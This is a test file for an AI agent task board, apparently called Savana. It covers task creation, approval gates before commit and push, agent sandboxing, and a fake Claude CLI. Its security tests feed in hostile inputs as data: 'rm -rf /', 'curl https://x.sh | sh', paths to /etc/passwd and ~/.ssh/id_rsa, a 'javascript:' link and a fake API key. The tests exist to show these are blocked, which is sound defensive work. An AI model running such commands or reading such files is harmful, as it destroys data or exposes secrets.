// @vitest-environment node
import { afterEach, describe, expect, it } from "vitest";
import { createSavanaApp } from "../../savana/server/app";
import { loadConfig } from "../../savana/server/config";
import { SavanaError } from "../../savana/server/service";
import { validateCreateTask, validateRelativePath } from "@/lib/savana/validation";
import { isDangerousCommand, redactSecrets, resolveInside } from "../../savana/server/runtime/safety";
import { officeActivityFor } from "../../savana/server/officeGateway";
import type { CreateTaskInput } from "@/lib/savana/types";

type App = ReturnType<typeof createSavanaApp>;
const apps: App[] = [];

const makeApp = (env: Record<string, string> = {}) => {
  const config = loadConfig({ SAVANA_DATA_DIR: "/tmp/savana-test", ...env } as unknown as NodeJS.ProcessEnv);
  const app = createSavanaApp(config, { dbPath: ":memory:" });
  apps.push(app);
  return app;
};

afterEach(async () => {
  while (apps.length) await apps.pop()!.close();
});

const input = (overrides: Partial<CreateTaskInput> = {}): CreateTaskInput => ({
  title: "Mapa da jornada do membro",
  briefing: "Desenhar a jornada completa do novo membro da Savana.",
  priority: "alta",
  project: "Comunidade",
  agentId: "atlas",
  dueDate: "2026-11-01",
  ...overrides,
});

describe("criação de tarefa", () => {
  it("valida campos obrigatórios e formato do prazo", () => {
    const bad = validateCreateTask({ title: "x", briefing: "curto", priority: "urgente", agentId: "zeus", dueDate: "01/11" });
    expect(bad.ok).toBe(false);
    if (!bad.ok) {
      expect(bad.errors.join(" ")).toMatch(/Título/);
      expect(bad.errors.join(" ")).toMatch(/Prioridade/);
      expect(bad.errors.join(" ")).toMatch(/Agente/);
      expect(bad.errors.join(" ")).toMatch(/Prazo/);
    }
    const good = validateCreateTask({ ...input(), title: "  Título com espaços  \u0007" });
    expect(good.ok && good.value.title).toBe("Título com espaços");
  });

  it("cria tarefa na fila com linha do tempo e persiste no SQLite", () => {
    const { service } = makeApp();
    const task = service.createTask(input());
    expect(task.status).toBe("na_fila");
    expect(task.simulated).toBe(false);
    const detail = service.getTaskDetail(task.id);
    expect(detail.task.title).toBe("Mapa da jornada do membro");
    expect(detail.timeline[0].kind).toBe("criada");
    expect(service.listTasks({ agentId: "atlas" })).toHaveLength(1);
  });

  it("cria tarefa pela API HTTP e rejeita payload inválido", async () => {
    const { server } = makeApp();
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = (server.address() as { port: number }).port;
    const base = `http://127.0.0.1:${port}/api`;
    const ok = await fetch(`${base}/tasks`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(input({ agentId: "lume" })),
    });
    expect(ok.status).toBe(201);
    const bad = await fetch(`${base}/tasks`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ title: "" }),
    });
    expect(bad.status).toBe(400);
    const form = await fetch(`${base}/tasks`, { method: "POST", body: "title=x" });
    expect(form.status).toBe(415);
  });
});

describe("mudança de status", () => {
  it("segue a máquina de estados e registra o histórico", () => {
    const { service } = makeApp();
    const task = service.createTask(input());
    service.transitionTask(task.id, "preparando");
    service.transitionTask(task.id, "trabalhando");
    const done = service.transitionTask(task.id, "em_revisao", { actor: "humano" }, { note: "pronto" });
    expect(done.status).toBe("em_revisao");
    const statuses = service.getTaskDetail(task.id).timeline.filter((e) => e.kind === "status");
    expect(statuses.map((e) => e.toStatus)).toEqual(["preparando", "trabalhando", "em_revisao"]);
  });

  it("rejeita transições inválidas", () => {
    const { service } = makeApp();
    const task = service.createTask(input());
    expect(() => service.transitionTask(task.id, "concluido")).toThrow(SavanaError);
    expect(() => service.transitionTask(task.id, "aguardando_aprovacao")).toThrow(/aprovação/);
  });

  it("exige motivo para bloquear", () => {
    const { service } = makeApp();
    const task = service.createTask(input());
    expect(() => service.transitionTask(task.id, "bloqueado")).toThrow(/motivo/);
    const blocked = service.transitionTask(task.id, "bloqueado", { actor: "humano" }, { blockedReason: "Falta acesso" });
    expect(blocked.blockedReason).toBe("Falta acesso");
    expect(service.overview().blockedTasks).toHaveLength(1);
  });
});

describe("aprovação", () => {
  it("coloca a tarefa em espera e libera ao aprovar", () => {
    const { service } = makeApp();
    const task = service.createTask(input({ agentId: "forja" }));
    service.transitionTask(task.id, "trabalhando");
    const approval = service.requestApproval(
      { taskId: task.id, action: "commit", summary: "Commitar alteração" },
      { actor: "agente" }
    );
    expect(service.getTask(task.id).status).toBe("aguardando_aprovacao");
    expect(() => service.transitionTask(task.id, "em_revisao")).toThrow(/aprovação pendente/);
    const resolved = service.resolveApproval(approval.id, "aprovada", { decidedBy: "Ismael" });
    expect(resolved.status).toBe("aprovada");
    expect(service.getTask(task.id).status).toBe("trabalhando");
    expect(() => service.resolveApproval(approval.id, "aprovada")).toThrow(/já foi decidida/);
  });

  it("rejeição exige motivo e bloqueia a tarefa", () => {
    const { service } = makeApp();
    const task = service.createTask(input({ agentId: "pulso" }));
    service.transitionTask(task.id, "trabalhando");
    const approval = service.requestApproval(
      { taskId: task.id, action: "mensagem", summary: "Enviar follow-up" },
      { actor: "agente" }
    );
    expect(() => service.resolveApproval(approval.id, "rejeitada")).toThrow(/motivo/);
    service.resolveApproval(approval.id, "rejeitada", { note: "Tom inadequado" });
    const after = service.getTask(task.id);
    expect(after.status).toBe("bloqueado");
    expect(after.blockedReason).toMatch(/Tom inadequado/);
  });

  it("agente reflete 'aguardando aprovação' quando há runtime ativo", () => {
    const { service, runtime } = makeApp({ SAVANA_RUNTIME: "demo", SAVANA_DEMO_STEP_MS: "100000" });
    const task = service.createTask(input({ agentId: "forja" }));
    service.transitionTask(task.id, "trabalhando");
    service.requestApproval({ taskId: task.id, action: "push", summary: "Push" }, { actor: "agente" });
    expect(service.listAgents().find((a) => a.id === "forja")?.status).toBe("aguardando_aprovacao");
    runtime.dispose();
  });
});

describe("runtime não configurado", () => {
  it("é o padrão, não executa nada e deixa os agentes offline", () => {
    const { service } = makeApp();
    const info = service.getRuntimeInfo();
    expect(info.mode).toBe("nao_configurado");
    expect(info.canExecute).toBe(false);
    expect(info.simulated).toBe(false);
    expect(info.nextSteps.length).toBeGreaterThan(0);
    expect(service.listAgents().every((a) => a.status === "offline")).toBe(true);
  });

  it("registra honestamente que ninguém executou a tarefa", () => {
    const { service } = makeApp();
    const task = service.createTask(input());
    const detail = service.getTaskDetail(task.id);
    expect(detail.task.status).toBe("na_fila");
    expect(detail.runs).toHaveLength(0);
    expect(detail.artifacts).toHaveLength(0);
    const runtimeNote = detail.timeline.find((e) => e.kind === "runtime");
    expect(runtimeNote?.message).toMatch(/não configurado/);
    expect(detail.timeline.every((e) => !e.simulated)).toBe(true);
  });

  it("modo Claude Code sem habilitar não executa e lista requisitos", () => {
    const { service, runtime } = makeApp({ SAVANA_RUNTIME: "claude-code", SAVANA_CLAUDE_BIN: "/nao/existe/claude" });
    const info = service.getRuntimeInfo();
    expect(info.canExecute).toBe(false);
    expect(info.requirements.some((r) => !r.ok)).toBe(true);
    const task = service.createTask(input({ agentId: "atlas" }));
    expect(() => runtime.startRun!(task.id)).toThrow(/não está pronto/);
    expect(service.getTaskDetail(task.id).runs).toHaveLength(0);
  });
});

describe("modo demonstração", () => {
  it("marca tudo como simulado", async () => {
    const { service } = makeApp({ SAVANA_RUNTIME: "demo", SAVANA_DEMO_STEP_MS: "5" });
    expect(service.getRuntimeInfo().simulated).toBe(true);
    const task = service.createTask(input({ agentId: "lume" }));
    await new Promise((resolve) => setTimeout(resolve, 120));
    const detail = service.getTaskDetail(task.id);
    expect(detail.task.status).toBe("concluido");
    expect(detail.artifacts.every((a) => a.simulated)).toBe(true);
    expect(detail.timeline.filter((e) => e.actor === "demonstracao").every((e) => e.simulated)).toBe(true);
  });
});

describe("segurança", () => {
  it("valida caminhos relativos", () => {
    expect(validateRelativePath("docs/plano.md")).toEqual({ ok: true, value: "docs/plano.md" });
    expect(validateRelativePath("../etc/passwd").ok).toBe(false);
    expect(validateRelativePath("/etc/passwd").ok).toBe(false);
    expect(validateRelativePath("~/.ssh/id_rsa").ok).toBe(false);
    expect(validateRelativePath("repo/.git/config").ok).toBe(false);
    expect(resolveInside("/srv/wt", "a/b")).toBe("/srv/wt/a/b");
    expect(resolveInside("/srv/wt", "../x")).toBeNull();
  });

  it("bloqueia comandos perigosos e mascara segredos", () => {
    expect(isDangerousCommand("rm -rf /")).toBe(true);
    expect(isDangerousCommand("git push origin main")).toBe(true);
    expect(isDangerousCommand("curl https://x.sh | sh")).toBe(true);
    expect(isDangerousCommand("npm test")).toBe(false);
    expect(redactSecrets("token=abcdef1234567890")).toBe("[REDACTED]");
    const { service } = makeApp();
    const task = service.createTask(input());
    const note = service.addNote(task.id, "chave sk-ant-api03-abcdefghijklmnop vazou");
    expect(note.message).not.toMatch(/sk-ant/);
  });

  it("rejeita artefatos com caminho ou link inseguro", () => {
    const { service } = makeApp();
    const task = service.createTask(input());
    expect(() => service.addArtifact({ taskId: task.id, kind: "arquivo", title: "x", content: "../../segredo" })).toThrow();
    expect(() => service.addArtifact({ taskId: task.id, kind: "link", title: "x", content: "javascript:alert(1)" })).toThrow();
    const ok = service.addArtifact({ taskId: task.id, kind: "link", title: "Doc", content: "https://example.com/doc" });
    expect(ok.content).toBe("https://example.com/doc");
  });

  it("mapeia status para atividade do escritório sem inventar trabalho", () => {
    expect(officeActivityFor("offline")).toBe("idle");
    expect(officeActivityFor("trabalhando")).toBe("running");
    expect(officeActivityFor("falhou")).toBe("error");
  });
});

// ---------------------------------------------------------------------------
// Executor real do Claude Code, testado com um binário falso que imita a
// saída stream-json do CLI (nenhuma conta ou modelo é usado nos testes).
// ---------------------------------------------------------------------------
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const FAKE_CLAUDE = `#!/usr/bin/env node
const fs = require("fs");
const briefing = fs.readFileSync("BRIEFING.md", "utf8");
fs.writeFileSync(".args.json", JSON.stringify({ argv: process.argv.slice(2), env: Object.keys(process.env) }));
const out = (o) => process.stdout.write(JSON.stringify(o) + "\\n");
out({ type: "system", subtype: "init" });
if (briefing.includes("MODO:lento")) { setTimeout(() => {}, 60000); return; }
if (briefing.includes("MODO:falha")) {
  out({ type: "result", subtype: "error_max_turns", is_error: true, result: "Limite de turnos" });
  process.exit(1);
}
out({ type: "assistant", message: { content: [{ type: "text", text: "Lendo o briefing" }, { type: "tool_use", name: "Write", input: { file_path: process.cwd() + "/resultado.md" } }] } });
if (fs.existsSync(".git")) fs.writeFileSync("feature.txt", "nova funcionalidade\\n");
if (!briefing.includes("MODO:sem-resultado")) fs.writeFileSync("resultado.md", "## Resumo\\nResultado de teste");
out({ type: "result", subtype: "success", is_error: false, result: "Pronto", total_cost_usd: 0.0123 });
`;

const makeRealApp = (extra: Record<string, string> = {}) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "savana-cc-"));
  const bin = path.join(dir, "claude");
  fs.writeFileSync(bin, FAKE_CLAUDE, { mode: 0o755 });
  return makeApp({
    SAVANA_RUNTIME: "claude-code",
    SAVANA_CLAUDE_CODE_ENABLED: "true",
    SAVANA_CLAUDE_BIN: bin,
    SAVANA_DATA_DIR: dir,
    ...extra,
  });
};

const waitRunEnd = async (app: App, taskId: string) => {
  for (let i = 0; i < 200; i++) {
    const runs = app.service.getTaskDetail(taskId).runs;
    if (runs.length && runs[0].status !== "executando") return runs[0];
    await new Promise((r) => setTimeout(r, 25));
  }
  throw new Error("run did not finish");
};

describe("execução real com Claude Code", () => {
  it("só executa quando pedido, registra tudo e devolve para revisão", async () => {
    const app = makeRealApp();
    expect(app.service.getRuntimeInfo().canExecute).toBe(true);
    const task = app.service.createTask(input({ agentId: "atlas", briefing: "Resumir o documento de teste em 3 linhas." }));
    expect(app.service.getTask(task.id).status).toBe("na_fila"); // nada roda sozinho
    process.env.SAVANA_TEST_SECRET = "nao-pode-vazar";
    app.runtime.startRun!(task.id);
    expect(() => app.runtime.startRun!(task.id)).toThrow(/já está em execução/);
    const run = await waitRunEnd(app, task.id);
    delete process.env.SAVANA_TEST_SECRET;
    expect(run.status).toBe("concluido");
    expect(run.filesChanged).toContain("resultado.md");
    expect(run.resultSummary).toMatch(/0\.0123/);
    const detail = app.service.getTaskDetail(task.id);
    expect(detail.task.status).toBe("em_revisao");
    expect(detail.artifacts[0].content).toMatch(/Resultado de teste/);
    expect(detail.logs.some((l) => l.message.includes("Usando Write"))).toBe(true);
    const recorded = JSON.parse(fs.readFileSync(path.join(run.worktreePath!, ".args.json"), "utf8"));
    expect(recorded.argv.join(" ")).toMatch(/--disallowedTools Bash WebFetch WebSearch/);
    expect(recorded.env).not.toContain("SAVANA_TEST_SECRET");
  });

  it("marca falha com o motivo e permite tentar de novo", async () => {
    const app = makeRealApp();
    const task = app.service.createTask(input({ agentId: "lume", briefing: "Teste de erro MODO:falha no agente." }));
    app.runtime.startRun!(task.id);
    const run = await waitRunEnd(app, task.id);
    expect(run.status).toBe("falhou");
    expect(app.service.getTask(task.id).status).toBe("falhou");
    expect(run.resultSummary).toMatch(/Limite de turnos/);
  });

  it("falha se o agente não gerar o arquivo de resultado", async () => {
    const app = makeRealApp();
    const task = app.service.createTask(input({ agentId: "pulso", briefing: "Teste MODO:sem-resultado do agente." }));
    app.runtime.startRun!(task.id);
    const run = await waitRunEnd(app, task.id);
    expect(run.status).toBe("falhou");
    expect(run.resultSummary).toMatch(/sem gerar resultado\.md/);
  });

  it("cancela uma execução em andamento", async () => {
    const app = makeRealApp();
    const task = app.service.createTask(input({ agentId: "nexo", briefing: "Teste MODO:lento para cancelar." }));
    app.runtime.startRun!(task.id);
    await new Promise((r) => setTimeout(r, 300));
    app.runtime.cancelRun!(task.id);
    const run = await waitRunEnd(app, task.id);
    expect(run.status).toBe("cancelado");
    const after = app.service.getTask(task.id);
    expect(after.status).toBe("bloqueado");
    expect(after.blockedReason).toMatch(/cancelada/);
  });

  it("respeita o tempo-limite", async () => {
    const app = makeRealApp({ SAVANA_RUN_TIMEOUT_MS: "10000" });
    // forces a short timeout directly on the config used by the runtime
    (app.runtime as unknown as { config: { runTimeoutMs: number } }).config.runTimeoutMs = 300;
    const task = app.service.createTask(input({ agentId: "atlas", briefing: "Teste MODO:lento para tempo-limite." }));
    app.runtime.startRun!(task.id);
    const run = await waitRunEnd(app, task.id);
    expect(run.status).toBe("falhou");
    expect(run.resultSummary).toMatch(/Tempo-limite/);
  });

  it("FORJA sem repositório configurado não executa", () => {
    const app = makeRealApp();
    const task = app.service.createTask(input({ agentId: "forja" }));
    expect(() => app.runtime.startRun!(task.id)).toThrow(/SAVANA_REPO_ROOT/);
  });
});

import { execFileSync } from "node:child_process";

const sh = (cwd: string, ...args: string[]) => execFileSync("git", args, { cwd, encoding: "utf8" }).trim();

const makeRepo = () => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), "savana-repo-"));
  const origin = path.join(base, "origin.git");
  const repo = path.join(base, "repo");
  fs.mkdirSync(repo);
  sh(base, "init", "--bare", "-q", origin);
  sh(repo, "init", "-q", "-b", "main");
  sh(repo, "config", "user.email", "teste@savana.local");
  sh(repo, "config", "user.name", "Teste Savana");
  fs.writeFileSync(path.join(repo, "README.md"), "# projeto\n");
  fs.writeFileSync(path.join(repo, ".gitignore"), ".args.json\n"); // test-only file written by the fake CLI
  sh(repo, "add", ".");
  sh(repo, "commit", "-q", "-m", "inicial");
  sh(repo, "remote", "add", "origin", origin);
  return { base, repo, origin };
};

describe("FORJA com worktree e aprovação de commit/push", () => {
  it("trabalha numa worktree isolada e só faz commit/push depois de aprovado", async () => {
    const { base, repo, origin } = makeRepo();
    const app = makeRealApp({ SAVANA_REPO_ROOT: repo, SAVANA_WORKTREE_ROOT: path.join(base, "worktrees") });
    expect(app.service.getRuntimeInfo().runnableAgents).toContain("forja");
    const task = app.service.createTask(input({ agentId: "forja", title: "Adicionar funcionalidade", briefing: "Criar o arquivo de funcionalidade de teste." }));
    app.runtime.startRun!(task.id);
    const run = await waitRunEnd(app, task.id);
    expect(run.status).toBe("concluido");
    expect(run.branch).toMatch(/^savana\/forja\//);
    expect(run.filesChanged).toEqual(["feature.txt"]); // BRIEFING.md e resultado.md nunca entram

    // a ferramenta de shell do agente está restrita
    const argv = JSON.parse(fs.readFileSync(path.join(run.worktreePath!, ".args.json"), "utf8")).argv.join(" ");
    expect(argv).toMatch(/Bash\(git commit:\*\)/);
    expect(argv).toMatch(/Bash\(npm test:\*\)/);

    // nada foi commitado ainda; o repositório principal está intocado
    let detail = app.service.getTaskDetail(task.id);
    expect(detail.task.status).toBe("aguardando_aprovacao");
    expect(detail.artifacts.some((a) => a.kind === "diff" && a.content.includes("feature.txt"))).toBe(true);
    expect(sh(repo, "log", "--oneline", run.branch!).split("\n")).toHaveLength(1);
    expect(fs.existsSync(path.join(repo, "feature.txt"))).toBe(false);

    // aprovar o commit
    const commitApproval = detail.approvals.find((a) => a.action === "commit")!;
    app.service.resolveApproval(commitApproval.id, "aprovada");
    detail = app.service.getTaskDetail(task.id);
    expect(detail.task.status).toBe("em_revisao");
    expect(detail.runs[0].commitSha).toMatch(/^[0-9a-f]{40}$/);
    expect(sh(repo, "show", "--name-only", "--format=%s", run.branch!)).toMatch(/savana\(forja\): Adicionar funcionalidade[\s\S]*feature.txt/);
    expect(sh(repo, "show", "--name-only", "--format=", run.branch!)).not.toMatch(/resultado.md|BRIEFING.md/);
    expect(sh(repo, "rev-parse", "--abbrev-ref", "HEAD")).toBe("main");

    // push exige outra aprovação e só envia a branch do FORJA
    expect(() => sh(origin, "rev-parse", "--verify", run.branch!)).toThrow();
    const pushApproval = app.runtime.requestPush!(task.id);
    expect(app.service.getTask(task.id).status).toBe("em_revisao");
    app.service.resolveApproval(pushApproval.id, "aprovada");
    expect(sh(origin, "rev-parse", run.branch!)).toBe(app.service.getTaskDetail(task.id).runs[0].commitSha);
    expect(() => sh(origin, "rev-parse", "--verify", "main")).toThrow();
    expect(app.service.getTaskDetail(task.id).runs[0].pushedAt).not.toBeNull();
  });

  it("rejeitar o commit bloqueia a tarefa sem criar commit", async () => {
    const { base, repo } = makeRepo();
    const app = makeRealApp({ SAVANA_REPO_ROOT: repo, SAVANA_WORKTREE_ROOT: path.join(base, "worktrees") });
    const task = app.service.createTask(input({ agentId: "forja", briefing: "Criar o arquivo de funcionalidade de teste." }));
    app.runtime.startRun!(task.id);
    const run = await waitRunEnd(app, task.id);
    const approval = app.service.getTaskDetail(task.id).approvals[0];
    app.service.resolveApproval(approval.id, "rejeitada", { note: "Refazer com testes" });
    expect(app.service.getTask(task.id).status).toBe("bloqueado");
    expect(sh(repo, "log", "--oneline", run.branch!).split("\n")).toHaveLength(1);
  });
});
